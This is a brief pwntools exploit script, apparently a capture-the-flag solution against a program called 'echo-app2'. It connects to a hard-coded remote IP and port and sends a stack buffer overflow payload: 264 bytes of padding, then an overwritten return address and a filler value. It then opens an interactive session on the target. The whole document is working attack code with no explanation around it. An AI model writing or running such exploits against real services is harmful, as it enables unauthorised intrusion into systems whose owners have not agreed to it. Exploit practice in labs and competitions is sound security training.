from pwn import *
p = remote('54.85.45.101', 8009)
#p = process('./echo-app2')
#elf = ELF('./echo-app2')

payload = b'A' * 264
payload += p64(0x1229)
payload += p64(0xdeadbeefdeadbeef)

p.sendline(payload)
p.interactive()